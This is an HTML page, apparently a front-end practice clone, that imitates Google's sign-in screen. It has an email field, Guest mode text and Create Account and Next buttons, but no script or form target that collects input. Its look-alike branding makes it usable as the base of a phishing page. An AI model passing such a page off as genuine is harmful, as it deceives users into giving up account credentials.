<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Sign in</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="google.svg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="container">
        <div class="container-left">
            <img src="google.svg" class=" g-class">
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
        </div>
        <div class="container-right">
            <br><br><br>
            <input type="email" name="email" id="signmail"  class="mail" placeholder="Email or Phone">
            <div class="cont-yaz">
                <p class="forgotmail">Forgot Mail?</p>
            
                <p class="not">Not your computer? Use Guest mode to sign in privately.</p>
    
                <p class="learn">Learn more about using Guest mode</p>
            </div>
          

                <div class="cont-bt">
                    <button class="create-bt">Create Account</button>

                    <button class="next-bt">Next</button>
                </div>
         

        </div>
    </div>
</body>

</html>
